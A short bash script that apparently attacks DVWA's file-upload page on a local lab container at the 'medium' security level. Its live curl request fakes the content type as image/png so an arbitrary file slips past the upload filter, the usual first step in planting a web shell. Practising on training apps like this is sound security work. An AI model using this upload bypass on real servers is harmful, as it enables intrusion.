#!/bin/bash

phpsessid="$1"
filename="$2"

# good POST request
#curl -v \
#	--cookie "PHPSESSID=$phpsessid; security=medium" \
#	-F "MAX_FILE_SIZE=100000" \
#	-F "Upload=Upload" \
#	-F "uploaded=@`pwd`/$filename" \
#	http://172.17.0.2/vulnerabilities/upload/

curl -v \
	--cookie "PHPSESSID=$phpsessid; security=medium" \
	-F "MAX_FILE_SIZE=100000" \
	-F "Upload=Upload" \
	-F "uploaded=@$filename; type=image/png" \
	http://172.17.0.2/vulnerabilities/upload/

